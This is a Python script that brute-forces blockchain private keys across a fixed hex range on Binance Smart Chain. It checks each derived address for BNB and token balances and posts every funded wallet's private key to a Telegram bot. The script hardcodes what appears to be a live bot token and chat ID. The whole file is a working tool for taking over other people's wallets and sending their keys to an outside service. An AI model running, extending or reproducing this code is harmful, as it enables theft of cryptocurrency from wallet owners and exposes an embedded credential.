from web3 import Web3
import json
import time
import requests
import concurrent.futures
import asyncio
import aiohttp
from eth_account import Account
from multiprocessing import Pool, cpu_count
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Multiple RPC endpoints for load balancing
RPC_ENDPOINTS = [
    'https://bsc-dataseed.binance.org/',
    'https://bsc-dataseed1.binance.org/',
    'https://bsc-dataseed2.binance.org/',
    'https://bsc-dataseed3.binance.org/',
    'https://bsc-dataseed4.binance.org/',
    'https://bsc-dataseed1.defibit.io/',
    'https://bsc-dataseed2.defibit.io/',
    'https://bsc-dataseed1.ninicoin.io/',
]

# Telegram Configuration
TELEGRAM_BOT_TOKEN = '7990540181:AAGKVAaZUlvh1_j4T_861s2wnagUHy3ZFeM'
TELEGRAM_CHAT_ID = '-4654599263'



# BEP-20 Token Contract Addresses on BSC
TOKEN_CONTRACTS = {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'BTC': '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
    'XRP': '0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE',
    'TRX': '0xCE7de646e7208a4Ef112cb6ed5038FA6cC6b12e3',
    'TON': '0x76A797A59Ba2C17726896976B7B3747BfD1d220f'
}

# Minimal ABI for balance checks (only the function signature we need)
BALANCE_ABI = [
    {
        "constant": True,
        "inputs": [{"name": "account", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "payable": False,
        "stateMutability": "view",
        "type": "function"
    }
]

# Network Information
NETWORK = {
    'name': 'Binance Smart Chain (BSC)',
    'explorer': 'https://bscscan.com/address/'
}

# Configuration
NUM_PROCESSES = max(1, cpu_count() - 1)  # Leave one CPU free
BATCH_SIZE = 1000  # Keys to process per batch
CONCURRENT_REQUESTS = 100  # Concurrent web3 calls
REQUEST_TIMEOUT = 2  # Seconds per request timeout
SKIP_EMPTY_BALANCE = True  # Skip addresses with 0 BNB for token checks

# Initialize global web3 instances (one per process)
web3_instances = []

def initialize_web3():
    """Initialize a Web3 instance with a random RPC endpoint"""
    import random
    endpoint = random.choice(RPC_ENDPOINTS)
    w3 = Web3(Web3.HTTPProvider(endpoint, request_kwargs={'timeout': REQUEST_TIMEOUT}))
    
    # Handle POA middleware in a version-agnostic way
    try:
        # Try the newer import path first
        from web3.middleware import geth_poa_middleware
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    except ImportError:
        try:
            # Try the older import path
            from web3.middleware.geth_poa import geth_poa_middleware
            w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        except ImportError:
            # If both fail, try another path or continue without middleware
            try:
                from web3._utils.middleware import geth_poa_middleware
                w3.middleware_onion.inject(geth_poa_middleware, layer=0)
            except ImportError:
                logger.warning("Could not import geth_poa_middleware. Chain compatibility may be limited.")
    
    return w3

def get_web3_instance():
    """Get or create a Web3 instance for the current process"""
    if not web3_instances:
        web3_instances.append(initialize_web3())
    return web3_instances[0]

async def send_telegram_message(session, message):
    """Send a message to Telegram asynchronously"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        async with session.post(url, json=payload, timeout=5) as response:
            return await response.json()
    except Exception as e:
        logger.error(f"Failed to send Telegram message: {e}")
        return None

def generate_address_from_private_key(private_key_hex):
    """Generate Ethereum address from private key"""
    try:
        account = Account.from_key('0x' + private_key_hex)
        return account.address
    except Exception as e:
        logger.error(f"Error generating address from key {private_key_hex[:8]}...: {e}")
        return None

def check_batch(start_key, count):
    """Check a batch of private keys for balances"""
    # Get a Web3 instance for this process
    web3 = get_web3_instance()
    results = []

    # Generate all addresses in the batch first
    keys_and_addresses = []
    for i in range(count):
        current_key = start_key + i
        private_key = f"{current_key:064x}"
        address = generate_address_from_private_key(private_key)
        if address:
            keys_and_addresses.append((private_key, address))

    if not keys_and_addresses:
        return results

    # Check BNB balances for all addresses at once using multicall or batching if available
    # For simplicity, we'll check them one by one but in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT_REQUESTS) as executor:
        # First check BNB balances
        future_to_key = {
            executor.submit(check_bnb_balance, web3, addr): (pk, addr)
            for pk, addr in keys_and_addresses
        }

        # Process BNB balance results
        addresses_with_balance = []
        for future in concurrent.futures.as_completed(future_to_key):
            pk, addr = future_to_key[future]
            try:
                bnb_balance = future.result()
                # If address has BNB or we're checking all addresses for tokens
                if bnb_balance > 0 or not SKIP_EMPTY_BALANCE:
                    addresses_with_balance.append((pk, addr, {"BNB": bnb_balance}))
            except Exception as e:
                logger.error(f"Error checking BNB balance for {addr}: {e}")

        # Then check token balances for addresses with BNB
        if addresses_with_balance:
            token_futures = []
            for pk, addr, balances in addresses_with_balance:
                for token, contract_addr in TOKEN_CONTRACTS.items():
                    token_futures.append((
                        executor.submit(check_token_balance, web3, contract_addr, addr),
                        pk, addr, balances, token
                    ))

            # Process token balance results
            for future, pk, addr, balances, token in token_futures:
                try:
                    token_balance = future.result()
                    balances[token] = token_balance
                except Exception as e:
                    logger.error(f"Error checking {token} balance for {addr}: {e}")
                    balances[token] = 0.0

            # Add to results any address with a positive balance in any token
            for pk, addr, balances in addresses_with_balance:
                if any(bal > 0 for bal in balances.values()):
                    results.append((pk, addr, balances))

    return results

def check_bnb_balance(web3, address):
    """Check BNB balance for an address"""
    try:
        balance = web3.eth.get_balance(address)
        return float(web3.from_wei(balance, 'ether'))
    except Exception:
        return 0.0

def check_token_balance(web3, contract_address, address):
    """Check token balance for a specific contract and address"""
    try:
        contract = web3.eth.contract(address=contract_address, abi=BALANCE_ABI)
        balance = contract.functions.balanceOf(address).call()
        return float(web3.from_wei(balance, 'ether'))
    except Exception:
        return 0.0

def format_telegram_message(address, private_key, balances):
    """Format a Telegram message for a found wallet"""
    network = NETWORK['name']
    explorer_url = f"{NETWORK['explorer']}{address}"

    message = f"""🚨 <b>Wallet with Balance Found!</b> 🚨

🔗 <b>Network:</b> {network}
📭 <b>Address:</b> <code>{address}</code>
🔑 <b>Private Key:</b> <code>{private_key}</code>
🔍 <b>Explorer:</b> <a href="{explorer_url}">{address}</a>

💰 <b>Balances:</b>"""

    # Add balances to message
    has_balance = False
    for token, balance in balances.items():
        if balance > 0:
            has_balance = True
            message += f"\n  • <b>{token}:</b> {balance:.8f}"

    # If no balances are positive, show zeros
    if not has_balance:
        for token, balance in balances.items():
            message += f"\n  • <b>{token}:</b> {balance:.8f}"

    return message

async def main():
    """Main function to run the wallet balance checker"""
    starting_key = int("5886e795c3e1bcd2d4946aaf16e2572f0ee7f2ffdbacf5c1a28d8519a07abdc7", 16)
    ending_key = int("58a82b0e4c2e287c00a6f1d11e58bdab16a9a8558519e55da8e38115a6e2cbb9", 16)

    total_keys = ending_key - starting_key + 1
    processed = 0
    found_wallets = 0
    start_time = time.time()

    logger.info(f"Starting scan of {total_keys:,} private keys using {NUM_PROCESSES} processes")
    logger.info(f"Target: ~1000 keys per 10 seconds")

    async with aiohttp.ClientSession() as session:
        # Send starting message
        start_msg = f"🚀 Starting wallet scan from {starting_key:x} to {ending_key:x}"
        await send_telegram_message(session, start_msg)
        
        # Create a process pool for parallel processing
        with Pool(processes=NUM_PROCESSES) as pool:
            current_key = starting_key

            while current_key <= ending_key:
                batch_tasks = []

                # Create batches for parallel processing
                for _ in range(NUM_PROCESSES):
                    if current_key > ending_key:
                        break

                    # Determine batch size
                    batch_count = min(BATCH_SIZE, ending_key - current_key + 1)

                    # Add the batch to tasks
                    batch_tasks.append(pool.apply_async(check_batch, (current_key, batch_count)))
                    current_key += batch_count

                # Process results as they complete
                for task in batch_tasks:
                    try:
                        results = task.get()
                        batch_size = BATCH_SIZE  # Could be less for the last batch
                        processed += batch_size

                        # Send Telegram messages for found wallets
                        for private_key, address, balances in results:
                            found_wallets += 1
                            message = format_telegram_message(address, private_key, balances)
                            await send_telegram_message(session, message)
                            logger.info(f"Found wallet with balance: {address}")

                    except Exception as e:
                        logger.error(f"Error processing batch: {e}")

                # Calculate and display performance metrics
                elapsed = time.time() - start_time
                if elapsed > 0:
                    keys_per_second = processed / elapsed
                    keys_per_10sec = keys_per_second * 10

                    logger.info(f"Progress: {processed:,}/{total_keys:,} keys checked ({(processed/total_keys*100):.2f}%)")
                    logger.info(f"Performance: {keys_per_second:.2f} keys/sec = {keys_per_10sec:.2f} keys/10sec")
                    logger.info(f"Found wallets: {found_wallets}")

                    # If we've processed enough keys, send a progress update
                    update_interval = BATCH_SIZE * NUM_PROCESSES * 10
                    if processed % update_interval == 0 or processed % update_interval < BATCH_SIZE:
                        progress_msg = (
                            f"Progress Update: Checked {processed:,} keys ({(processed/total_keys*100):.2f}%). "
                            f"Found {found_wallets} wallets with balance. "
                            f"Speed: {keys_per_10sec:.0f} keys/10sec"
                        )
                        await send_telegram_message(session, progress_msg)

        # Send completion message
        total_time = time.time() - start_time
        final_speed = processed / total_time if total_time > 0 else 0
        completion_msg = (
            f"✅ Scan completed in {total_time:.2f} seconds.\n"
            f"• Checked {processed:,} keys\n"
            f"• Found {found_wallets} wallets with balances\n"
            f"• Average speed: {final_speed:.2f} keys/sec = {final_speed*10:.2f} keys/10sec"
        )
        logger.info(completion_msg)
        await send_telegram_message(session, completion_msg)

if __name__ == "__main__":
    try:
        # Run the async main function
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Script interrupted by user. Shutting down...")
    except Exception as e:
        logger.error(f"Fatal error: {e}")